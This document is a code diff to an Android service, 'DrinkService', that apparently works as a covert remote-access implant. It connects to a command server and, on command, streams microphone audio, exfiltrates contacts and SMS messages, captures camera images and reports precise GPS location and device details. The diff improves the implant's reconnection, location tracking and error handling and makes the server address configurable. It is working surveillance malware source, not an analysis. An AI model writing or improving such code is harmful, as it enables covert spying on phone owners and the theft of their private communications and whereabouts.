@@ -16,9 +16,12 @@ import android.hardware.camera2.CameraDevice
 import android.hardware.camera2.CameraManager
 import android.hardware.camera2.CaptureRequest
 import android.hardware.camera2.CaptureResult
-import android.hardware.camera2.TotalCaptureResult
 import android.location.Location
+import android.location.LocationListener
 import android.location.LocationManager
+import android.os.Bundle
+import android.os.Looper
+import kotlin.coroutines.resume
 import android.media.AudioFormat
 import android.media.AudioRecord
 import android.media.ImageReader
@@ -41,6 +44,7 @@ import android.telephony.TelephonyManager
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import kotlinx.coroutines.*
+import kotlinx.coroutines.channels.Channel
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
@@ -54,6 +58,8 @@ class DrinkService : Service() {
     companion object {
         const val ACTION_STATUS = "com.drink.STATUS"
         const val EXTRA_CONNECTED = "connected"
+        const val ENABLE_CAMERA = false
+        @Volatile var isConnected = false
         private const val HOST = "192.168.1.149"
         private const val PORT = 33110
         private const val CHANNEL_ID = "drink_channel"
@@ -65,7 +71,7 @@ class DrinkService : Service() {
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var socketManager: SocketManager? = null
     private var micJob: Job? = null
-    private var reconnectJob: Job? = null
+    private val reconnectChannel = Channel<Unit>(Channel.CONFLATED)
     private var running = false
     private var wakeLock: PowerManager.WakeLock? = null
     private var networkCallback: ConnectivityManager.NetworkCallback? = null
@@ -84,7 +90,9 @@ class DrinkService : Service() {
         val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
         val callback = object : ConnectivityManager.NetworkCallback() {
             override fun onAvailable(network: Network) {
-                triggerReconnect()
+                if (socketManager == null || !isConnected) {
+                    triggerReconnect()
+                }
             }
             override fun onLost(network: Network) {
                 runCatching { socketManager?.close() }
@@ -105,7 +113,7 @@ class DrinkService : Service() {
     override fun onDestroy() {
         running = false
         micJob?.cancel()
-        reconnectJob?.cancel()
+        reconnectChannel.close()
         socketManager?.close()
         runCatching {
             val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
@@ -117,13 +125,13 @@ class DrinkService : Service() {
     }
 
     private fun triggerReconnect() {
-        reconnectJob?.cancel()
+        reconnectChannel.trySend(Unit)
     }
 
     private fun applyForegroundMode(extraType: Int) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             var type = ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-            if (extraType != 0) {
+            if (extraType != 0 && (ENABLE_CAMERA || extraType != ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)) {
                 type = type or extraType
             }
             runCatching {
@@ -137,9 +145,11 @@ class DrinkService : Service() {
     private suspend fun connectionLoop() {
         while (running) {
             try {
-                val sm = SocketManager(HOST, PORT)
+                val prefs = getSharedPreferences("drink_prefs", Context.MODE_PRIVATE)
+                val host = prefs.getString("server_host", HOST) ?: HOST
+                val port = prefs.getInt("server_port", PORT)
+                val sm = SocketManager(host, port)
                 socketManager = sm
-                broadcastStatus(true)
                 commandLoop(sm)
             } catch (e: Exception) {
                 broadcastStatus(false)
@@ -151,33 +161,54 @@ class DrinkService : Service() {
                 broadcastStatus(false)
             }
             if (running) {
-                try {
-                    coroutineScope {
-                        reconnectJob = launch { delay(RECONNECT_DELAY) }
-                        reconnectJob?.join()
-                    }
-                } catch (e: CancellationException) {
+                withTimeoutOrNull(RECONNECT_DELAY) {
+                    reconnectChannel.receive()
                 }
             }
         }
     }
 
+    private fun sendCameraDisabled(sm: SocketManager) {
+        runCatching {
+            val err = JSONObject().apply {
+                put("type", "error")
+                put("cmd", "cams")
+                put("message", "Camera feature is disabled")
+            }
+            sm.sendFrame(err)
+        }
+    }
+
+    private fun handleStopMic() {
+        micJob?.cancel()
+        micJob = null
+        applyForegroundMode(0)
+    }
+
     private suspend fun commandLoop(sm: SocketManager) {
-        while (running && sm.isConnected()) {
-            val frame = sm.readFrame()
-            when (frame.optString("cmd")) {
-                "use_mic" -> handleMic(sm)
-                "get_contacts" -> handleContacts(sm)
-                "get_sms" -> handleSms(sm, frame)
-                "list_cams" -> handleListCams(sm)
-                "use_cam" -> handleUseCam(sm, frame)
-                "get_telemetry" -> handleTelemetry(sm)
-                "disconnect" -> {
-                    micJob?.cancel()
-                    sm.close()
-                    return
+        try {
+            while (running && sm.isConnected()) {
+                val frame = sm.readFrame()
+                if (!isConnected) {
+                    broadcastStatus(true)
+                }
+                when (frame.optString("cmd")) {
+                    "connected" -> {}
+                    "use_mic" -> handleMic(sm)
+                    "stop_mic" -> handleStopMic()
+                    "get_contacts" -> handleContacts(sm)
+                    "get_sms" -> handleSms(sm, frame)
+                    "list_cams" -> if (ENABLE_CAMERA) handleListCams(sm) else sendCameraDisabled(sm)
+                    "use_cam" -> if (ENABLE_CAMERA) handleUseCam(sm, frame) else sendCameraDisabled(sm)
+                    "get_telemetry" -> handleTelemetry(sm)
+                    "disconnect" -> {
+                        sm.close()
+                        return
+                    }
                 }
             }
+        } finally {
+            handleStopMic()
         }
     }
 
@@ -185,11 +216,14 @@ class DrinkService : Service() {
         micJob?.cancel()
         micJob = scope.launch {
             if (ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-                val errorHeader = JSONObject().apply {
-                    put("type", "error")
-                    put("message", "Record audio permission not granted")
+                runCatching {
+                    val errorHeader = JSONObject().apply {
+                        put("type", "error")
+                        put("cmd", "mic")
+                        put("message", "Record audio permission not granted")
+                    }
+                    sm.sendFrame(errorHeader)
                 }
-                sm.sendFrame(errorHeader)
                 return@launch
             }
             applyForegroundMode(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
@@ -198,16 +232,17 @@ class DrinkService : Service() {
                 AudioFormat.CHANNEL_IN_MONO,
                 AudioFormat.ENCODING_PCM_16BIT
             )
+            val actualBufferSize = if (bufferSize > 0) bufferSize else 4096
             val recorder = AudioRecord(
                 MediaRecorder.AudioSource.MIC,
                 SAMPLE_RATE,
                 AudioFormat.CHANNEL_IN_MONO,
                 AudioFormat.ENCODING_PCM_16BIT,
-                bufferSize
+                actualBufferSize
             )
             try {
                 recorder.startRecording()
-                val buffer = ByteArray(bufferSize)
+                val buffer = ByteArray(actualBufferSize)
                 while (isActive && sm.isConnected()) {
                     val read = recorder.read(buffer, 0, buffer.size)
                     if (read > 0) {
@@ -217,14 +252,21 @@ class DrinkService : Service() {
                             put("size", chunk.size)
                         }
                         sm.sendFrame(header, chunk)
+                    } else if (read < 0) {
+                        break
                     }
                 }
             } catch (e: Exception) {
-                val errorHeader = JSONObject().apply {
-                    put("type", "error")
-                    put("message", e.message ?: "Mic stream failed")
+                if (sm.isConnected() && isActive) {
+                    runCatching {
+                        val errorHeader = JSONObject().apply {
+                            put("type", "error")
+                            put("cmd", "mic")
+                            put("message", e.message ?: "Mic stream failed")
+                        }
+                        sm.sendFrame(errorHeader)
+                    }
                 }
-                sm.sendFrame(errorHeader)
             } finally {
                 runCatching {
                     recorder.stop()
@@ -245,11 +287,14 @@ class DrinkService : Service() {
             }
             sm.sendFrame(header, zipBytes)
         } catch (e: Exception) {
-            val errorHeader = JSONObject().apply {
-                put("type", "error")
-                put("message", e.message ?: "Failed to get contacts")
+            runCatching {
+                val errorHeader = JSONObject().apply {
+                    put("type", "error")
+                    put("cmd", "contacts")
+                    put("message", e.message ?: "Failed to get contacts")
+                }
+                sm.sendFrame(errorHeader)
             }
-            sm.sendFrame(errorHeader)
         }
     }
 
@@ -313,11 +358,14 @@ class DrinkService : Service() {
             }
             sm.sendFrame(response)
         } catch (e: Exception) {
-            val errorHeader = JSONObject().apply {
-                put("type", "error")
-                put("message", e.message ?: "Failed to read SMS")
+            runCatching {
+                val errorHeader = JSONObject().apply {
+                    put("type", "error")
+                    put("cmd", "sms")
+                    put("message", e.message ?: "Failed to read SMS")
+                }
+                sm.sendFrame(errorHeader)
             }
-            sm.sendFrame(errorHeader)
         }
     }
 
@@ -376,6 +424,7 @@ class DrinkService : Service() {
         } catch (e: Exception) {
             val errorHeader = JSONObject().apply {
                 put("type", "error")
+                put("cmd", "cams")
                 put("message", e.message ?: "Failed to list cameras")
             }
             sm.sendFrame(errorHeader)
@@ -394,6 +443,7 @@ class DrinkService : Service() {
             if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                 val err = JSONObject().apply {
                     put("type", "error")
+                    put("cmd", "camera_capture")
                     put("message", "Camera permission not granted")
                 }
                 sm.sendFrame(err)
@@ -453,6 +503,7 @@ class DrinkService : Service() {
                     } catch (e: Exception) {
                         val err = JSONObject().apply {
                             put("type", "error")
+                            put("cmd", "camera_capture")
                             put("message", e.message ?: "Failed to process photo")
                         }
                         sm.sendFrame(err)
@@ -525,6 +576,7 @@ class DrinkService : Service() {
                                     cleanup()
                                     val err = JSONObject().apply {
                                         put("type", "error")
+                                        put("cmd", "camera_capture")
                                         put("message", e.message ?: "Failed capture")
                                     }
                                     sm.sendFrame(err)
@@ -535,6 +587,7 @@ class DrinkService : Service() {
                                 cleanup()
                                 val err = JSONObject().apply {
                                     put("type", "error")
+                                    put("cmd", "camera_capture")
                                     put("message", "Camera session config failed")
                                 }
                                 sm.sendFrame(err)
@@ -544,6 +597,7 @@ class DrinkService : Service() {
                         cleanup()
                         val err = JSONObject().apply {
                             put("type", "error")
+                            put("cmd", "camera_capture")
                             put("message", e.message ?: "Failed to create session")
                         }
                         sm.sendFrame(err)
@@ -558,6 +612,7 @@ class DrinkService : Service() {
                     cleanup()
                     val err = JSONObject().apply {
                         put("type", "error")
+                        put("cmd", "camera_capture")
                         put("message", "Camera error $error")
                     }
                     sm.sendFrame(err)
@@ -566,9 +621,70 @@ class DrinkService : Service() {
         } catch (e: Exception) {
             val err = JSONObject().apply {
                 put("type", "error")
+                put("cmd", "camera_capture")
                 put("message", e.message ?: "Failed to open camera")
             }
             sm.sendFrame(err)
+        }
+    }
+
+    private suspend fun acquireLocation(): Location? {
+        if (ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
+            ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            return null
+        }
+        val lm = getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return null
+
+        var bestLoc: Location? = null
+        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)
+        for (p in providers) {
+            runCatching {
+                val l = lm.getLastKnownLocation(p) ?: return@runCatching
+                if (bestLoc == null || l.time > (bestLoc?.time ?: 0L)) {
+                    bestLoc = l
+                }
+            }
+        }
+
+        if (bestLoc != null && (System.currentTimeMillis() - bestLoc!!.time) < 120000L) {
+            return bestLoc
+        }
+
+        val targetProvider = when {
+            lm.isProviderEnabled(LocationManager.GPS_PROVIDER) -> LocationManager.GPS_PROVIDER
+            lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER) -> LocationManager.NETWORK_PROVIDER
+            else -> providers.firstOrNull { lm.isProviderEnabled(it) }
+        } ?: return bestLoc
+
+        return try {
+            withTimeoutOrNull(4000L) {
+                suspendCancellableCoroutine<Location?> { cont ->
+                    val listener = object : LocationListener {
+                        override fun onLocationChanged(location: Location) {
+                            runCatching { lm.removeUpdates(this) }
+                            if (cont.isActive) cont.resume(location)
+                        }
+                        override fun onProviderDisabled(provider: String) {}
+                        override fun onProviderEnabled(provider: String) {}
+                        @Deprecated("Deprecated in Java")
+                        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
+                    }
+                    cont.invokeOnCancellation {
+                        runCatching { lm.removeUpdates(listener) }
+                    }
+                    try {
+                        lm.requestSingleUpdate(targetProvider, listener, Looper.getMainLooper())
+                    } catch (e: Exception) {
+                        try {
+                            lm.requestLocationUpdates(targetProvider, 0L, 0f, listener, Looper.getMainLooper())
+                        } catch (e2: Exception) {
+                            if (cont.isActive) cont.resume(bestLoc)
+                        }
+                    }
+                }
+            } ?: bestLoc
+        } catch (e: Exception) {
+            bestLoc
         }
     }
 
@@ -659,31 +775,22 @@ class DrinkService : Service() {
                 val securityPatch = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Build.VERSION.SECURITY_PATCH else "N/A"
                 val uptimeSeconds = SystemClock.elapsedRealtime() / 1000
 
-                var lat: Double? = null
-                var lon: Double? = null
-                var accuracy: Float? = null
-                var altitude: Double? = null
-                var locTime: Long? = null
-                if (ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
-                    ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
-                    runCatching {
-                        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-                        var bestLoc: Location? = null
-                        val providers = lm.getProviders(true)
-                        for (p in providers) {
-                            val l = lm.getLastKnownLocation(p) ?: continue
-                            if (bestLoc == null || l.accuracy < bestLoc.accuracy) {
-                                bestLoc = l
-                            }
-                        }
-                        bestLoc?.let {
-                            lat = it.latitude
-                            lon = it.longitude
-                            accuracy = it.accuracy
-                            altitude = it.altitude
-                            locTime = it.time
-                        }
-                    }
+                val hasLocationPerm = ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
+                    ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
+                val loc = if (hasLocationPerm) acquireLocation() else null
+
+                val locObj = JSONObject()
+                if (!hasLocationPerm) {
+                    locObj.put("status", "permission_denied")
+                } else if (loc != null) {
+                    locObj.put("status", "available")
+                    locObj.put("latitude", loc.latitude)
+                    locObj.put("longitude", loc.longitude)
+                    locObj.put("accuracy", loc.accuracy.toDouble())
+                    locObj.put("altitude", loc.altitude)
+                    locObj.put("timestamp", loc.time)
+                } else {
+                    locObj.put("status", "unavailable")
                 }
 
                 val resp = JSONObject().apply {
@@ -722,28 +829,24 @@ class DrinkService : Service() {
                         put("security_patch", securityPatch)
                         put("uptime_seconds", uptimeSeconds)
                     })
-                    if (lat != null && lon != null) {
-                        put("location", JSONObject().apply {
-                            put("latitude", lat)
-                            put("longitude", lon)
-                            put("accuracy", accuracy)
-                            put("altitude", altitude)
-                            put("timestamp", locTime)
-                        })
-                    }
+                    put("location", locObj)
                 }
                 sm.sendFrame(resp)
             } catch (e: Exception) {
-                val err = JSONObject().apply {
-                    put("type", "error")
-                    put("message", e.message ?: "Failed to get telemetry")
+                runCatching {
+                    val err = JSONObject().apply {
+                        put("type", "error")
+                        put("cmd", "telemetry")
+                        put("message", e.message ?: "Failed to get telemetry")
+                    }
+                    sm.sendFrame(err)
                 }
-                sm.sendFrame(err)
             }
         }
     }
 
     private fun broadcastStatus(connected: Boolean) {
+        isConnected = connected
         val intent = Intent(ACTION_STATUS).apply {
             putExtra(EXTRA_CONNECTED, connected)
         }
